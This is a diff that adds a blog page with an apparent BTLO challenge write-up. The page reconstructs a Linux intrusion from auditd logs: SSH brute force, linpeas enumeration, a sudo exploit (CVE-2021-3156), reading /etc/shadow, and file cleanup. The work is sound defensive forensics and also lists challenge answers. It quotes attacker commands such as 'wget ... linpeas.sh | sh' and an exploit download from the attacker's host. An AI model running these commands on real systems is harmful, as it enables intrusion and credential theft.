@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Executive Summary A forensic review of Linux auditd logs confirms that the host was compromised through an external SSH brute-force attack. The attacker authenticated as a low-privileged user, executed automated system enumeration, escalated privileges using a local sudo vulnerability, accessed sensitive credential material, and attempted basic anti-forensic cleanup. The entire intrusion lifecycle occurred within approximately six minutes.
+Scope and Evidence Primary artifact:
+audit.log (Linux auditd) Tools used:
+aureport ausearch Manual timeline correlation Observed timeframe:" />
+<meta name="keywords" content=", btlo, incident-response, linux, auditd, bruteforce, privilege-escalation, forensics" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/btlo/incident-response/paranoid/" />
+
+
+    <title>
+        
+            BTLO Incident Response Case Study: Pranoid :: Hello w3nch 
+        
+    </title>
+
+
+
+
+
+  <link rel="stylesheet" href="/main.min.ebe3824dfa5345ef854f8b255c278f701966e9be3892354b588fb1650ecd358e.css" integrity="sha256-6&#43;OCTfpTRe&#43;FT4slXCePcBlm6b44kjVLWI&#43;xZQ7NNY4=" crossorigin="anonymous">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="css/code.css">
+    
+
+    
+        <link rel="stylesheet" type="text/css" href="css/writeups.css">
+    
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="BTLO Incident Response Case Study: Pranoid">
+<meta itemprop="description" content="Executive Summary A forensic review of Linux auditd logs confirms that the host was compromised through an external SSH brute-force attack. The attacker authenticated as a low-privileged user, executed automated system enumeration, escalated privileges using a local sudo vulnerability, accessed sensitive credential material, and attempted basic anti-forensic cleanup. The entire intrusion lifecycle occurred within approximately six minutes.
+Scope and Evidence Primary artifact:
+audit.log (Linux auditd) Tools used:
+aureport ausearch Manual timeline correlation Observed timeframe:"><meta itemprop="datePublished" content="2026-01-28T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2026-01-28T00:00:00+00:00" />
+<meta itemprop="wordCount" content="1002">
+<meta itemprop="keywords" content="btlo,incident-response,linux,auditd,bruteforce,privilege-escalation,forensics," />
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="BTLO Incident Response Case Study: Pranoid"/>
+<meta name="twitter:description" content="Executive Summary A forensic review of Linux auditd logs confirms that the host was compromised through an external SSH brute-force attack. The attacker authenticated as a low-privileged user, executed automated system enumeration, escalated privileges using a local sudo vulnerability, accessed sensitive credential material, and attempted basic anti-forensic cleanup. The entire intrusion lifecycle occurred within approximately six minutes.
+Scope and Evidence Primary artifact:
+audit.log (Linux auditd) Tools used:
+aureport ausearch Manual timeline correlation Observed timeframe:"/>
+
+
+
+
+
+    <meta property="article:section" content="Incident Response" />
+
+    <meta property="article:section" content="Linux Forensics" />
+
+
+
+    <meta property="article:published_time" content="2026-01-28 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text ">
+                hello ;)</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+                <nav class="menu">
+    <ul class="menu__inner">
+                <li><a href="/about/">About</a></li>
+            
+                <li><a href="/posts/">Blog</a></li>
+            
+                <li><a href="/contact/">Contact</a></li>
+            
+                <li><a href="/resume.pdf">Resume</a></li>
+            
+                <li><a href="/writeups/">Writeup</a></li>
+            
+    </ul>
+</nav>
+
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            
+    <div class="content">
+        <main class="post">
+
+            <div class="post-info">
+                
+                </p>
+            </div>
+
+            <article>
+                <h2 class="post-title"><a href="http://localhost:1313/writeups/btlo/incident-response/paranoid/">BTLO Incident Response Case Study: Pranoid</a></h2>
+
+                
+                
+                
+
+                <div class="post-content">
+                    <h2 id="executive-summary">Executive Summary</h2>
+<p>A forensic review of Linux auditd logs confirms that the host was compromised through an external SSH brute-force attack. The attacker authenticated as a low-privileged user, executed automated system enumeration, escalated privileges using a local sudo vulnerability, accessed sensitive credential material, and attempted basic anti-forensic cleanup. The entire intrusion lifecycle occurred within approximately six minutes.</p>
+<hr>
+<h2 id="scope-and-evidence">Scope and Evidence</h2>
+<p>Primary artifact:</p>
+<ul>
+<li>audit.log (Linux auditd)</li>
+</ul>
+<p>Tools used:</p>
+<ul>
+<li>aureport</li>
+<li>ausearch</li>
+<li>Manual timeline correlation</li>
+</ul>
+<p>Observed timeframe:</p>
+<ul>
+<li>2021-10-04 20:22:07 to 2021-10-04 20:28:06</li>
+</ul>
+<h2 id="initial-triage-and-signal-identification">Initial Triage and Signal Identification</h2>
+<p>A summary analysis of the audit log shows extreme activity density over a short time window:</p>
+<ul>
+<li>87 failed login attempts</li>
+<li>89 failed authentication attempts</li>
+<li>1,606 failed syscalls</li>
+<li>115 unique executables</li>
+<li>192 commands executed</li>
+<li>10,679 unique process IDs</li>
+<li>16,732 total audit events</li>
+</ul>
+<p>This volume and velocity of activity is inconsistent with human interaction and strongly indicative of automation.</p>
+<h2 id="initial-access-vector">Initial Access Vector</h2>
+<h3 id="authentication-activity">Authentication Activity</h3>
+<p>Audit records show repeated SSH authentication attempts targeting a single user account.</p>
+<p><img src="https://i.ibb.co/W43Lcwff/Pasted-image-20260128153416.png" alt=""></p>
+<p>Targeted account:</p>
+<ul>
+<li>Username: btlo</li>
+<li>UID: 1001</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo ausearch --input audit.log -m USER_AUTH,USER_LOGIN <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>| grep -E <span style="color:#e6db74">&#34;res=failed|success=no&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>| grep -E <span style="color:#e6db74">&#34;addr=|rhost=&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>| sed -n <span style="color:#e6db74">&#39;s/.*addr=\([^ ]*\).*/\1/p&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>| sort | uniq -c | sort -nr
+</span></span></code></pre></div><p><img src="https://i.ibb.co/VcqPZmW4/Pasted-image-20260128154343.png" alt=""></p>
+<p>Source of authentication attempts:</p>
+<ul>
+<li>IP address: 192.168.4.155</li>
+<li>Service: /usr/sbin/sshd</li>
+</ul>
+<p>Observed pattern:</p>
+<ul>
+<li>Dozens of failed SSH login attempts</li>
+<li>One successful authentication from the same source IP</li>
+</ul>
+<p>This pattern confirms a successful SSH brute-force attack.</p>
+<h2 id="post-compromise-command-activity">Post-Compromise Command Activity</h2>
+<p>Immediately following authentication, terminal (TTY) logs reveal a structured sequence of commands executed by the attacker.</p>
+<h3 id="initial-environment-reconnaissance">Initial Environment Reconnaissance</h3>
+<p><img src="https://i.ibb.co/jvgjcpy1/Pasted-image-20260128153618.png" alt=""></p>
+<p>Commands observed:</p>
+<ul>
+<li>hostname</li>
+<li>whoami</li>
+<li>ls</li>
+<li>sudo -l</li>
+</ul>
+<p>Purpose:</p>
+<ul>
+<li>Confirm host identity</li>
+<li>Identify current privilege level</li>
+<li>Enumerate accessible files</li>
+<li>Check sudo permissions and misconfigurations</li>
+</ul>
+<p>These commands are typical of post-login validation performed by attackers.</p>
+<h2 id="automated-system-enumeration">Automated System Enumeration</h2>
+<p>Shortly after initial recon, the attacker retrieved and executed an enumeration script from the same external IP used during brute-force attempts.</p>
+<p>Command observed:</p>
+<ul>
+<li>wget -O - http://192.168.4.155:8000/linpeas.sh | sh</li>
+</ul>
+<p>Source:</p>
+<ul>
+<li>Remote host: 192.168.4.155</li>
+<li>Protocol: HTTP</li>
+<li>Tool delivered: linpeas.sh</li>
+</ul>
+<p>Purpose:</p>
+<ul>
+<li>Automated enumeration of kernel, sudo, SUID, cron, and configuration weaknesses</li>
+<li>Identification of local privilege escalation vectors</li>
+</ul>
+<p>The execution of linpeas explains the subsequent surge in command executions and process creation.</p>
+<h2 id="privilege-escalation-staging">Privilege Escalation Staging</h2>
+<p>Following enumeration, the attacker staged a local exploit.</p>
+<p><img src="https://i.ibb.co/n8t2Yxm3/Pasted-image-20260128154055.png" alt=""></p>
+<p>Commands observed:</p>
+<ul>
+<li>wget http://192.168.4.155:8000/evil.tar.gz</li>
+<li>tar zxvf evil.tar.gz</li>
+<li>cd evil</li>
+<li>make</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo aureport -p -if audit.log pipe grep <span style="color:#e6db74">&#39;evil&#39;</span>
+</span></span><span style="display:flex;"><span>16156. 05/10/21 05:57:17 <span style="color:#ae81ff">829992</span> /home/btlo/evil/evil <span style="color:#ae81ff">59</span> <span style="color:#ae81ff">1001</span> <span style="color:#ae81ff">481021</span>
+</span></span></code></pre></div><p>Source:</p>
+<ul>
+<li>Remote host: 192.168.4.155</li>
+<li>Payload type: Source code archive</li>
+</ul>
+<p>Purpose:</p>
+<ul>
+<li>Deliver exploit source code</li>
+<li>Compile exploit locally to evade signature-based detection</li>
+</ul>
+<h2 id="privilege-escalation-execution">Privilege Escalation Execution</h2>
+<p>The attacker executed the compiled binary:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo ausearch --input audit.log -m EXECVE | grep evil
+</span></span></code></pre></div><p>Command observed:</p>
+<ul>
+<li>./evil 0</li>
+</ul>
+<p>Execution metadata:</p>
+<ul>
+<li>Binary name: evil</li>
+<li>Execution path: /home/btlo/evil/evil</li>
+<li>Process ID: 829992</li>
+<li>Executing user: btlo (UID 1001)</li>
+</ul>
+<p>Immediately following execution, the attacker revalidated privileges.</p>
+<p>Command observed:</p>
+<ul>
+<li>whoami</li>
+</ul>
+<p>Subsequent actions confirm that the exploit successfully escalated privileges to root.</p>
+<h2 id="anti-forensic-cleanup">Anti-Forensic Cleanup</h2>
+<p>After achieving elevated privileges, the attacker removed exploit artifacts.</p>
+<p>Commands observed:</p>
+<ul>
+<li>rm -rf /home/btlo/evil</li>
+<li>rm /home/btlo/evil.tar.gz</li>
+</ul>
+<p>Purpose:</p>
+<ul>
+<li>Remove compiled binary and source code</li>
+<li>Reduce post-incident forensic artifacts</li>
+</ul>
+<p>This cleanup was minimal but deliberate.</p>
+<h2 id="data-access-and-impact">Data Access and Impact</h2>
+<p>With root-level access confirmed, the attacker accessed sensitive credential storage.</p>
+<p>Command observed:</p>
+<ul>
+<li>cat /etc/shadow</li>
+</ul>
+<p>Impact:</p>
+<ul>
+<li>Exposure of password hashes for local accounts</li>
+<li>Full credential compromise of the host</li>
+</ul>
+<p>This action confirms total system compromise and high business impact.</p>
+<h2 id="root-cause-analysis">Root Cause Analysis</h2>
+<p>The attack chain follows a well-established intrusion pattern:</p>
+<ol>
+<li>External SSH brute-force attack</li>
+<li>Successful authentication as low-privileged user</li>
+<li>Manual and automated reconnaissance</li>
+<li>Enumeration using linpeas</li>
+<li>Local exploit delivery and compilation</li>
+<li>Privilege escalation via sudo vulnerability</li>
+<li>Credential data access</li>
+<li>Anti-forensic artifact removal</li>
+</ol>
+<p>The exploit behavior and timeframe align with CVE-2021-3156, a heap-based buffer overflow vulnerability in sudo.</p>
+<h2 id="mitre-attck-mapping">MITRE ATT&amp;CK Mapping</h2>
+<table>
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Evidence Observed</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Initial Access</td>
+<td>T1110.001</td>
+<td>Brute Force: Password Guessing</td>
+<td>87 failed SSH logins, 89 failed auth attempts, single successful login</td>
+<td>SSH brute-force against user <code>btlo</code></td>
+</tr>
+<tr>
+<td>Execution</td>
+<td>T1059.004</td>
+<td>Command and Scripting Interpreter: Unix Shell</td>
+<td>Interactive TTY sessions, shell commands executed</td>
+<td>Shell used throughout attack</td>
+</tr>
+<tr>
+<td>Discovery</td>
+<td>T1082</td>
+<td>System Information Discovery</td>
+<td>hostname, lsb_release -a</td>
+<td>OS and host identification</td>
+</tr>
+<tr>
+<td>Discovery</td>
+<td>T1033</td>
+<td>System Owner/User Discovery</td>
+<td>whoami (pre and post privesc)</td>
+<td>Privilege validation</td>
+</tr>
+<tr>
+<td>Discovery</td>
+<td>T1083</td>
+<td>File and Directory Discovery</td>
+<td>ls, find, grep, sed, cut, sort, uniq</td>
+<td>Automated enumeration</td>
+</tr>
+<tr>
+<td>Privilege Escalation</td>
+<td>T1068</td>
+<td>Exploitation for Privilege Escalation</td>
+<td>Execution of local exploit binary <code>evil</code></td>
+<td>Exploitation of sudo vulnerability</td>
+</tr>
+<tr>
+<td>Command and Control</td>
+<td>T1105</td>
+<td>Ingress Tool Transfer</td>
+<td>wget downloads from attacker host</td>
+<td>Tool and payload delivery</td>
+</tr>
+<tr>
+<td>Defense Evasion</td>
+<td>T1070.004</td>
+<td>Indicator Removal on Host: File Deletion</td>
+<td>rm -rf exploit directory and archive</td>
+<td>Anti-forensic cleanup</td>
+</tr>
+<tr>
+<td>Credential Access</td>
+<td>T1003.008</td>
+<td>OS Credential Dumping: /etc/shadow</td>
+<td>cat /etc/shadow</td>
+<td>Credential exposure</td>
+</tr>
+</tbody>
+</table>
+<h2 id="indicators-of-compromise-iocs">Indicators of Compromise (IOCs)</h2>
+<h3 id="network-iocs">Network IOCs</h3>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Indicator</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>IP Address</td>
+<td>192.168.4.155</td>
+<td>Source of brute-force and payload delivery</td>
+</tr>
+<tr>
+<td>URL</td>
+<td>http://192.168.4.155:8000/linpeas.sh</td>
+<td>Enumeration script</td>
+</tr>
+<tr>
+<td>URL</td>
+<td>http://192.168.4.155:8000/evil.tar.gz</td>
+<td>Privilege escalation payload</td>
+</tr>
+<tr>
+<td>Protocol</td>
+<td>SSH</td>
+<td>Initial access vector</td>
+</tr>
+<tr>
+<td>Protocol</td>
+<td>HTTP</td>
+<td>Tool and payload transfer</td>
+</tr>
+</tbody>
+</table>
+<h3 id="host-based-iocs">Host-Based IOCs</h3>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Indicator</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>User Account</td>
+<td>btlo</td>
+<td>Compromised user</td>
+</tr>
+<tr>
+<td>Process</td>
+<td>evil</td>
+<td>Privilege escalation binary</td>
+</tr>
+<tr>
+<td>Process ID</td>
+<td>829992</td>
+<td>PID of exploit execution</td>
+</tr>
+<tr>
+<td>File Path</td>
+<td>/home/btlo/evil/evil</td>
+<td>Compiled exploit binary</td>
+</tr>
+<tr>
+<td>File Path</td>
+<td>/home/btlo/evil.tar.gz</td>
+<td>Exploit archive</td>
+</tr>
+<tr>
+<td>File Access</td>
+<td>/etc/shadow</td>
+<td>Sensitive credential file accessed</td>
+</tr>
+<tr>
+<td>Tool</td>
+<td>linpeas.sh</td>
+<td>Automated enumeration script</td>
+</tr>
+</tbody>
+</table>
+<h3 id="behavioral-iocs">Behavioral IOCs</h3>
+<table>
+<thead>
+<tr>
+<th>Behavior</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SSH brute-force pattern</td>
+<td>High-volume failed SSH logins from single IP</td>
+</tr>
+<tr>
+<td>Automated enumeration</td>
+<td>Large volume of filesystem and command execution</td>
+</tr>
+<tr>
+<td>Local compilation</td>
+<td>make/gcc execution in user home directory</td>
+</tr>
+<tr>
+<td>Privilege transition</td>
+<td>whoami before and after exploit execution</td>
+</tr>
+<tr>
+<td>Anti-forensics</td>
+<td>Immediate deletion of exploit artifacts</td>
+</tr>
+</tbody>
+</table>
+<h3 id="challenge-submission">Challenge Submission</h3>
+<ul>
+<li>
+<p><strong>Compromised account:</strong> <code>btlo</code></p>
+</li>
+<li>
+<p><strong>Initial access technique:</strong> SSH brute-force attack</p>
+</li>
+<li>
+<p><strong>Attacker IP:</strong> <code>192.168.4.155</code></p>
+</li>
+<li>
+<p><strong>Enumeration tool:</strong> <code>linpeas</code></p>
+</li>
+<li>
+<p><strong>Privilege escalation binary &amp; PID:</strong> <code>evil</code>, PID <code>829992</code></p>
+</li>
+<li>
+<p><strong>CVE exploited:</strong> CVE-2021-3156</p>
+</li>
+<li>
+<p><strong>Vulnerability type:</strong> Heap-based buffer overflow (Local Privilege Escalation)</p>
+</li>
+<li>
+<p><strong>Exfiltrated file:</strong> <code>/etc/shadow</code></p>
+</li>
+</ul>
+<hr>
+<h2 id="conclusion">Conclusion</h2>
+<p>This incident demonstrates how a combination of weak authentication controls and unpatched local vulnerabilities can lead to rapid and complete system compromise. Despite the absence of a SIEM or EDR platform, auditd logs provided sufficient telemetry to reconstruct the attacker’s full kill chain with high confidence.</p>
+<p>The case reinforces the importance of:</p>
+<ul>
+<li>SSH hardening and rate limiting</li>
+<li>Strong password policies</li>
+<li>Timely patching of privilege escalation vulnerabilities</li>
+<li>Retention and review of auditd logs for forensic readiness</li>
+</ul>
+
+                </div>
+            </article>
+
+            <hr />
+
+            <div class="post-info">
+                
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="http://localhost:1313/tags/btlo/">btlo</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/incident-response/">incident-response</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/linux/">linux</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/auditd/">auditd</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/bruteforce/">bruteforce</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/privilege-escalation/">privilege-escalation</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/forensics/">forensics</a></span>
+        
+    </p>
+
+                
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="http://localhost:1313/categories/incident-response/">Incident Response</a></span>
+        <span class="tag"><a href="http://localhost:1313/categories/linux-forensics/">Linux Forensics</a></span>
+        
+    </p>
+
+            </div>
+        </main>
+    </div>
+
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            
+            <span><a href="http://localhost:1313/"></a></span>
+            <span></span>
+            
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by Hugo</span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.19d7885e5a4b0e5e2cd7238fc80b8b19888099cb78c032aedeb0b3b0010b8bb3dfb34849cf40a9e83f55f266aa32354528c10a24f2a42e6e8e21e813a26d9647.js" integrity="sha512-GdeIXlpLDl4s1yOPyAuLGYiAmct4wDKu3rCzsAELi7Pfs0hJz0Cp6D9V8maqMjVFKMEKJPKkLm6OIegTom2WRw=="></script>
+
+
+
+
+    </body>
+</html>
